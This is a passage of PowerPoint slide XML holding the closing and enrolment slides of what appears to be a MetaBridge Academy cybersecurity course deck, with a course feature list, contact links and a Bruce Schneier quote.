                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>□ Mentor someone newer than you</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ENROL / NEXT COHORT</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READY TO PROTECT NIGERIA'S DIGITAL FUTURE?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Join MetaBridge Academy's next cybersecurity cohort.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ 12 Modules · 46+ Contact Hours</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ 12 professional lab platforms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ Hands-on Nigerian threat scenarios</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ 1-on-1 WhatsApp mentor support</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ Capstone project for your portfolio</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>✓ Blockchain-verified professional certificate</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a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ENROL NOW → wa.me/2347034357206</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a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>metabridgeacademy.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Reference: Cybersecurity Sefer — metabridgeacademy.com</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060D1E"/>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73152"/>
            <a:ext cx="12188952" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1B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1612880" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CLOSING SLIDE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="274320" y="1005840"/>
            <a:ext cx="11612880" cy="5486400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>"Security is not a product you can buy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>It is a process you must practice."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>— Bruce Schneier</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Thank you for learning with MetaBridge Academy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Stay curious. Stay ethical. Stay dangerous.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>metabridgeacademy.com  ·  wa.me/2347034357206</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6675120"/>
            <a:ext cx="12188952" cy="182880"/>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